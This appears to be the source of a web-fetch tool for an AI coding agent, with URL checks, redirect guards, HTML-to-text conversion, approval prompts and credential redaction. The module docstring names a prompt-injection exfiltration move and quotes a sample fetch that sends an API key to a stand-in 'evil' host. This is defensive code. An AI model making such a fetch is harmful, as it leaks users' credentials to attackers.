"""Builtin ``web_fetch`` tool: GET one http(s) URL, return readable text.

Pages come back as plain text the model can use (HTML reduced to title,
headings, paragraphs, and ``text (url)`` links; JSON pretty-printed)
instead of raw markup through ``curl`` in local_shell. Fetching is an
outbound request chosen by the model, so it is gated like a command:
prompt_all asks, safe_auto/yolo fetch directly, and a URL carrying
credential-shaped values is refused outright — the classic prompt-
injection exfiltration move is "fetch https://evil/?k=<your API key>".
"""

from __future__ import annotations

import codecs
import http.client
import json
import re
import socket
import sys
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from typing import List, Optional, Tuple

from . import __version__
from .tooling import LocalShellPolicy, PermissionState, default_permissions

FETCH_TIMEOUT = 20
MAX_FETCH_BYTES = 2 * 1024 * 1024
MAX_REDIRECTS = 5
ERROR_EXCERPT_CHARS = 500
REDACTION_MARKER = "[credential redacted]"

WEB_FETCH_TOOL = {
    "type": "function",
    "function": {
        "name": "web_fetch",
        "description": (
            "Fetch an http(s) URL and return its content as readable text: "
            "HTML pages become plain text with headings and links, JSON is "
            "pretty-printed, other text is returned as-is. PDFs, images, and "
            "other binary content are refused. Never put credentials or "
            "secrets in the URL."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "http:// or https:// URL"},
                "max_chars": {
                    "type": "integer",
                    "description": "Optional cap on returned characters",
                },
            },
            "required": ["url"],
            "additionalProperties": False,
        },
    },
}

_HTML_TYPES = ("text/html", "application/xhtml+xml")
#: Non-``text/*`` types that are still plain text worth returning as-is.
_TEXTUAL_APPLICATION_TYPES = (
    "application/xml", "application/javascript", "application/x-javascript",
    "application/ecmascript", "application/x-yaml", "application/yaml",
    "application/toml", "application/x-sh", "application/sql",
)


def _credential_labels(text: str) -> List[str]:
    from .secretguard import redact_credentials

    return redact_credentials(text, REDACTION_MARKER)[1]


def url_problem(url: str) -> Optional[str]:
    """Why *url* must not be fetched, or None when it is acceptable."""
    try:
        parts = urllib.parse.urlsplit(url)
        host = parts.hostname
    except ValueError:
        return "the URL is malformed"
    scheme = parts.scheme.lower()
    if scheme not in ("http", "https"):
        shown = f"{scheme}:" if scheme else "no scheme"
        return f"only http:// and https:// URLs can be fetched (got {shown})"
    if not host:
        return "the URL has no host"
    if "@" in parts.netloc:
        return "the URL embeds user credentials (user:password@host)"
    labels = _credential_labels(url)
    unquoted = urllib.parse.unquote(url)
    if unquoted != url:
        labels += [label for label in _credential_labels(unquoted) if label not in labels]
    if labels:
        return (
            "the URL contains credential-shaped values ("
            + ", ".join(labels) + "); secrets are never sent in URLs"
        )
    return None


class _RedirectRefused(Exception):
    pass


class _GuardedRedirects(urllib.request.HTTPRedirectHandler):
    """Follow redirects (capped) only to URLs the same checks accept, so a
    redirect cannot smuggle the request onto another scheme (ftp, file)."""

    max_redirections = MAX_REDIRECTS

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        problem = url_problem(newurl)
        if problem:
            raise _RedirectRefused(f"redirect to {newurl} refused: {problem}")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


# ---------------------------------------------------------------------------
# HTML -> readable text
# ---------------------------------------------------------------------------

_SKIP_TAGS = frozenset({
    "script", "style", "noscript", "svg", "template", "iframe", "object",
    "canvas", "math",
})
#: Blocks set off by a blank line.
_PARAGRAPH_TAGS = frozenset({
    "address", "article", "aside", "blockquote", "details", "dialog", "dl",
    "fieldset", "figure", "footer", "form", "header", "hr", "main", "nav",
    "ol", "p", "pre", "section", "table", "ul",
})
#: Blocks that only start a new line.
_LINE_TAGS = frozenset({
    "body", "caption", "dd", "div", "dt", "figcaption", "html", "legend",
    "li", "summary", "tbody", "tfoot", "thead", "tr",
})
_HEADINGS = {f"h{level}": level for level in range(1, 7)}


class _Readable(HTMLParser):
    def __init__(self, base_url: str):
        super().__init__(convert_charrefs=True)
        self.base_url = base_url
        self.title = ""
        self._parts: List[str] = []
        self._skip: List[str] = []
        self._in_title = False
        self._title_seen = False
        self._pre = 0
        self._links: List[Tuple[int, str]] = []

    # output helpers --------------------------------------------------------

    def _last_char(self) -> str:
        for part in reversed(self._parts):
            if part:
                return part[-1]
        return "\n"

    def _trailing_newlines(self) -> int:
        count = 0
        for part in reversed(self._parts):
            stripped = part.rstrip("\n")
            count += len(part) - len(stripped)
            if stripped:
                return count
        return 2  # start of the document counts as a paragraph break

    def _break(self, blank: bool = False) -> None:
        """End the current line (and leave a blank line when *blank*)."""
        if self._parts and not self._pre:
            self._parts[-1] = self._parts[-1].rstrip(" ")
        missing = (2 if blank else 1) - self._trailing_newlines()
        if missing > 0:
            self._parts.append("\n" * missing)

    def _emit(self, text: str) -> None:
        if self._pre:
            self._parts.append(text)
            return
        text = re.sub(r"\s+", " ", text)
        if self._last_char() in "\n ":
            text = text.lstrip(" ")
        if text:
            self._parts.append(text)

    # parser callbacks ------------------------------------------------------

    def handle_starttag(self, tag, attrs):
        if tag in _SKIP_TAGS:
            self._skip.append(tag)
            return
        if self._skip:
            return
        if tag == "title" and not self._title_seen:
            self._in_title = True
            return
        if tag == "base":
            href = dict(attrs).get("href")
            if href:
                self.base_url = urllib.parse.urljoin(self.base_url, href)
            return
        if tag == "br":
            self._parts.append("\n")
            return
        if tag in _HEADINGS:
            self._break(blank=True)
            self._parts.append("#" * _HEADINGS[tag] + " ")
            return
        if tag == "li":
            self._break()
            self._parts.append("- ")
            return
        if tag in ("td", "th"):
            if self._last_char() not in "\n ":
                self._parts.append(" ")
            return
        if tag == "pre":
            self._break(blank=True)
            self._pre += 1
            return
        if tag in _PARAGRAPH_TAGS or tag in _LINE_TAGS:
            self._break(blank=tag in _PARAGRAPH_TAGS)
            return
        if tag == "a":
            self._links.append((len(self._parts), dict(attrs).get("href") or ""))

    def handle_endtag(self, tag):
        if tag in _SKIP_TAGS:
            if tag in self._skip:
                while self._skip and self._skip.pop() != tag:
                    pass
            return
        if self._skip:
            return
        if tag == "title":
            if self._in_title:
                self._in_title = False
                self._title_seen = True
                self.title = re.sub(r"\s+", " ", self.title).strip()
            return
        if tag == "pre":
            self._pre = max(0, self._pre - 1)
            self._break(blank=True)
            return
        if tag in _HEADINGS or tag in _PARAGRAPH_TAGS or tag in _LINE_TAGS:
            self._break(blank=tag not in _LINE_TAGS)
            return
        if tag == "a" and self._links:
            start, href = self._links.pop()
            self._render_link(start, href)

    def _render_link(self, start: int, href: str) -> None:
        href = href.strip()
        if not href or href.startswith("#") or href.lower().startswith("javascript:"):
            return
        url = urllib.parse.urljoin(self.base_url, href)
        text = re.sub(r"\s+", " ", "".join(self._parts[start:])).strip()
        if not text:
            return
        rendered = text if text == url else f"{text} ({url})"
        trailing = " " if "".join(self._parts[start:]).endswith(" ") else ""
        self._parts[start:] = [rendered + trailing]

    def handle_data(self, data):
        if self._in_title:
            self.title += data
            return
        if self._skip:
            return
        self._emit(data)

    def text(self) -> str:
        body = re.sub(r"[ \t]+\n", "\n", "".join(self._parts))
        return re.sub(r"\n{3,}", "\n\n", body).strip()


def html_to_text(html: str, base_url: str) -> str:
    """Readable text for *html*: the title first, then the body with
    script/style/noscript/svg dropped, blocks as line breaks, headings as
    ``#`` lines, and links as ``text (absolute-url)``."""
    parser = _Readable(base_url)
    try:
        parser.feed(html)
        parser.close()
    except Exception:
        # html.parser is lenient; anything it still chokes on keeps the
        # text gathered so far rather than failing the fetch.
        pass
    body = parser.text()
    if parser.title:
        return f"Title: {parser.title}\n\n{body}" if body else f"Title: {parser.title}"
    return body


# ---------------------------------------------------------------------------
# Client
# ---------------------------------------------------------------------------

def _charset_for(content_type_charset: Optional[str], data: bytes, html: bool) -> str:
    candidates = [content_type_charset or ""]
    if html:
        match = re.search(rb"""<meta[^>]+charset=["']?([A-Za-z0-9_.:-]+)""", data[:4096], re.I)
        if match:
            candidates.append(match.group(1).decode("ascii", "ignore"))
    for name in candidates:
        if not name:
            continue
        try:
            return codecs.lookup(name).name
        except LookupError:
            continue
    return "utf-8"


class WebFetchClient:
    """Serves web_fetch for one session."""

    name = "web"
    DEFAULT_RESULT_BUDGET = 15000

    def __init__(self, permissions: Optional[PermissionState] = None,
                 config: Optional[dict] = None):
        self.policy = LocalShellPolicy()
        self._permissions = permissions
        # Live config reference: web_fetch_allow_domains edits apply at once.
        self._config = config if config is not None else {}
        self._result_budget = self.DEFAULT_RESULT_BUDGET
        # Hosts the operator allowed for this session ('a' at the prompt).
        self._allowed_hosts = set()

    def bind_permissions(self, permissions: Optional[PermissionState]):
        self._permissions = permissions

    def permissions(self) -> PermissionState:
        return self._permissions or default_permissions()

    def set_policy(self, policy: LocalShellPolicy):
        self.policy = policy

    def set_result_budget(self, budget_chars: int):
        if budget_chars > 0:
            self._result_budget = budget_chars

    def remote_variant(self) -> "WebFetchClient":
        """Per-turn copy for remote/channel sessions: non-interactive and
        prompt_all, so only configured allow-domains are fetched."""
        clone = WebFetchClient(permissions=PermissionState(), config=self._config)
        clone.set_policy(LocalShellPolicy(interactive=False))
        clone._result_budget = self._result_budget
        return clone

    @staticmethod
    def _text(msg: str, error: bool = False) -> dict:
        result = {"content": [{"type": "text", "text": msg}]}
        if error:
            result["isError"] = True
        return result

    def _domain_allowed(self, host: str) -> bool:
        raw = str(self._config.get("web_fetch_allow_domains") or "")
        for entry in raw.split(","):
            domain = entry.strip().lower().lstrip(".").rstrip(".")
            if domain and (host == domain or host.endswith("." + domain)):
                return True
        return False

    def call_tool(self, name: str, arguments: dict) -> dict:
        arguments = arguments or {}
        url = str(arguments.get("url") or "").strip()
        if not url:
            return self._text("Error: url is required.", error=True)
        problem = url_problem(url)
        if problem:
            return self._text(f"Refused: {problem}.", error=True)
        try:
            max_chars = int(arguments.get("max_chars") or 0)
        except (TypeError, ValueError):
            max_chars = 0
        host = (urllib.parse.urlsplit(url).hostname or "").lower().rstrip(".")
        refusal = self._approve(url, host)
        if refusal:
            return self._text(refusal)
        limit = self._result_budget
        if max_chars > 0:
            limit = min(limit, max_chars)
        return self._fetch(url, limit)

    def _approve(self, url: str, host: str) -> Optional[str]:
        from .render import clear_active_spinners
        from .filetools import _visible

        shown = _visible(url, 300)
        mode = self.permissions().get_permission_mode()
        reason = None
        if self._domain_allowed(host):
            reason = "allowed domain"
        elif host in self._allowed_hosts:
            reason = "host allowed this session"
        elif self.policy.allow_auto_execute or mode in ("safe_auto", "yolo"):
            reason = "auto-approved"
        clear_active_spinners()
        if reason:
            print(f"\n  \033[1;36m\u21a7 Fetch\033[0m \033[1m{shown}\033[0m "
                  f"\033[2m({reason})\033[0m", flush=True)
            return None
        if not self.policy.interactive:
            return (
                "Refused: this session cannot prompt to approve fetching "
                f"{url}. Add its domain to web_fetch_allow_domains to allow it."
            )
        _input = self.policy.input_fn or input
        print()
        try:
            sys.stdout.flush()
            answer = _input(
                f"  \033[1;33mFetch\033[0m \033[1m{shown}\033[0m\033[1;33m? [y/n/a]\033[0m "
            ).strip()
        except (EOFError, KeyboardInterrupt) as exc:
            how = "interrupted" if isinstance(exc, KeyboardInterrupt) else "closed (EOF)"
            print(
                f"\n  \033[1;31m\u2717 Not fetched\033[0m \033[2m\u2014 approval "
                f"prompt {how}; no answer counts as no.\033[0m",
                flush=True,
            )
            return (
                f"User did not approve fetching {url} (the approval prompt was "
                f"{how}); nothing was fetched."
            )
        if answer.lower() in ("", "y", "yes"):
            return None
        if answer.lower() in ("a", "always"):
            self._allowed_hosts.add(host)
            print(f"  \033[2m(will fetch from {_visible(host)} without asking this session)\033[0m")
            return None
        try:
            feedback = _input("  \033[2mReason (optional):\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            feedback = ""
        msg = f"User declined to fetch {url}."
        if feedback:
            msg += f" Feedback: {feedback}"
        return msg

    def _fetch(self, url: str, limit: int) -> dict:
        request = urllib.request.Request(url, headers={
            "User-Agent": f"conch/{__version__}",
            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,"
                      "text/*;q=0.8,*/*;q=0.5",
        })
        opener = urllib.request.build_opener(_GuardedRedirects())
        try:
            with opener.open(request, timeout=FETCH_TIMEOUT) as response:
                status = response.getcode()
                final_url = response.geturl()
                headers = response.headers
                data = response.read(MAX_FETCH_BYTES + 1)
        except urllib.error.HTTPError as err:
            return self._http_error(url, err, limit)
        except _RedirectRefused as exc:
            return self._text(f"Refused: {exc}.", error=True)
        except (urllib.error.URLError, socket.timeout, http.client.HTTPException,
                OSError, ValueError) as exc:
            reason = getattr(exc, "reason", None) or exc
            return self._text(f"Error fetching {url}: {reason}", error=True)

        content_type = headers.get_content_type()
        clipped = len(data) > MAX_FETCH_BYTES
        data = data[:MAX_FETCH_BYTES]
        body, refusal = self._render_body(
            data, content_type, headers.get_content_charset(), final_url
        )
        header = (
            f"URL: {final_url}\nStatus: {status}\nContent-Type: {content_type}\n\n"
        )
        if refusal:
            return self._text(header + refusal, error=True)
        if clipped:
            body += "\n[response exceeded 2 MB; only the first 2 MB was read]"
        return self._text(self._finish(header, body, limit))

    def _render_body(self, data: bytes, content_type: str, charset: Optional[str],
                     base_url: str) -> Tuple[str, Optional[str]]:
        is_html = content_type in _HTML_TYPES
        is_json = content_type == "application/json" or content_type.endswith("+json")
        is_text = (
            content_type.startswith("text/")
            or content_type in _TEXTUAL_APPLICATION_TYPES
            or content_type.endswith("+xml")
        )
        if not (is_html or is_json or is_text):
            return "", (
                f"Refused: the response is {content_type}, which web_fetch "
                "cannot render as text (only HTML, JSON, and text are supported)."
            )
        if b"\x00" in data[:8192]:
            return "", (
                f"Refused: the response is labeled {content_type} but contains "
                "binary data."
            )
        text = data.decode(_charset_for(charset, data, is_html), errors="replace")
        if is_html:
            return html_to_text(text, base_url), None
        if is_json:
            try:
                return json.dumps(json.loads(text), indent=2, ensure_ascii=False), None
            except ValueError:
                return text, None
        return text, None

    def _finish(self, header: str, body: str, limit: int) -> str:
        from .runtime import truncate_middle

        text, labels = _redact(header + body)
        if labels:
            text += f"\n[conch redacted credential-shaped values: {', '.join(labels)}]"
        head_len = len(header)
        if len(text) > head_len + limit:
            text = text[:head_len] + truncate_middle(text[head_len:], limit)
        return text

    def _http_error(self, url: str, err: urllib.error.HTTPError, limit: int) -> dict:
        headers = err.headers
        content_type = headers.get_content_type() if headers is not None else "unknown"
        try:
            data = err.read(64 * 1024) or b""
        except Exception:
            data = b""
        excerpt = ""
        if data:
            body, refusal = self._render_body(
                data, content_type,
                headers.get_content_charset() if headers is not None else None,
                err.geturl() or url,
            )
            excerpt = "" if refusal else body.strip()
            if len(excerpt) > ERROR_EXCERPT_CHARS:
                excerpt = excerpt[:ERROR_EXCERPT_CHARS] + "\u2026"
        header = (
            f"URL: {err.geturl() or url}\nStatus: {err.code}\n"
            f"Content-Type: {content_type}\n\n"
        )
        body = f"HTTP error {err.code} {err.reason}."
        if excerpt:
            body += f" Response excerpt:\n{excerpt}"
        return self._text(self._finish(header, body, limit), error=True)


def _redact(text: str) -> Tuple[str, List[str]]:
    from .secretguard import redact_credentials

    return redact_credentials(text, REDACTION_MARKER)
